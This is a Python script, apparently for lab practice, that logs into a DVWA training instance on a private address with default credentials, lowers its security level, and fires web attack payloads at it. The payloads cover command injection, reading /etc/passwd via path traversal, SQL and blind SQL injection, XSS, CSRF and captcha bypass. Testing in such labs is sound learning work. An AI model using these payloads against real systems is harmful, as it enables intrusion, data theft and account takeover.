#!/usr/bin/env python3
import requests
import re

# DVWA配置
DVWA_URL = "http://192.168.127.128/DVWA"
session = requests.Session()

print("=== DVWA完整漏洞测试 ===")
print("")

# 1. 访问登录页获取token
login_page = session.get(f"{DVWA_URL}/login.php")
token_match = re.search(r"user_token.*value='([^']*)'", login_page.text)
user_token = token_match.group(1) if token_match else ""

# 2. 登录
login_data = {"username": "admin", "password": "password", "Login": "Login", "user_token": user_token}
session.post(f"{DVWA_URL}/login.php", data=login_data, allow_redirects=True)

# 3. 设置安全级别
session.post(f"{DVWA_URL}/security.php", data={"security": "low", "seclev_submit": "Submit"})
print("✅ 已登录并设为low")
print("")

# 测试列表
tests = [
    ("命令注入", "exec/", "post", {"ip": "127.0.0.1; id", "Submit": "Submit"}, "uid="),
    ("文件包含", "fi/?page=../../../../etc/passwd", "get", None, "root:x:"),
    ("XSS反射", "xss_r/?name=testxss", "get", None, "testxss"),
    ("SQL注入", "sqli/?id=1' OR '1'='1&Submit=Submit", "get", None, "Surname"),
    ("SQL盲注", "sqli_blind/?id=1' AND SLEEP(1)-- &Submit=Submit", "get", None, "First name"),
    ("CSRF", "csrf/", "post", {"password_new": "test123", "password_conf": "test123", "Change": "Change"}, "Password Changed"),
    ("文件上传", "upload/", "post", None, "Upload"),
    ("XSS存储", "xss_s/", "post", {"txtName": "test", "mtxMessage": "<script>alert(2)</script>", "btnSign": "Sign Guestbook"}, "Guestbook"),
    ("弱验证码", "captcha/", "post", {"step": "2", "captcha_passed": "1", "change": "Change", "password_new": "test", "password_conf": "test"}, "Password Changed"),
]

# 执行测试
for name, path, method, data, check_str in tests:
    print(f"--- {name} ---")
    try:
        if method == "post":
            if data:
                resp = session.post(f"{DVWA_URL}/vulnerabilities/{path}", data=data)
            else:
                resp = session.get(f"{DVWA_URL}/vulnerabilities/{path}")
        else:
            resp = session.get(f"{DVWA_URL}/vulnerabilities/{path}")
        
        if check_str in resp.text:
            print(f"✅ 存在漏洞")
        else:
            print(f"⚠️ 需进一步检查")
    except Exception as e:
        print(f"❌ 出错: {str(e)[:30]}")
    print("")

print("=== 测试完成 ===")